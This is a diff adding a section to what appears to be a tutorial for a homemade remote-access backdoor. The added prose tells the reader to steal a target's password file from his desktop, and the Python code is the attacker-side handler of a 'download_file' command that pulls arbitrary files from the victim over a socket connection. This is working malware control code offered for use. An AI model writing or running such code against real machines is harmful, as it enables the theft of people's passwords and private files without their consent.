@@ -163,3 +163,26 @@ of our program using ``` Custom_Dir ``` command and then choosing ``` c:\\ ```:
 
 ##
 
+##
+:star: Let's start downloading files from our target using ``` download_file  ``` command to run the following part of our program:
+Here we want to steel his MY-PASSWORD file including all his password saving on his desktop.
+
+```python
+    elif command == "download_file":
+        conn.send(command.encode())
+        print (" ")
+        filepath = input(str("Please enter the file path including the filename : "))
+        conn.send(filepath.encode())
+        file = conn.recv(100000)
+        print("")
+        filename = input(str("Please enter a filename for the incoming file including the extention :"))
+        new_file = open(filename, "wb")
+        new_file.write(file)
+        new_file.close()
+        print (" ")
+        print (filename, "Has been downloaded and saved ")
+        print (" ")
+
+
+```
+
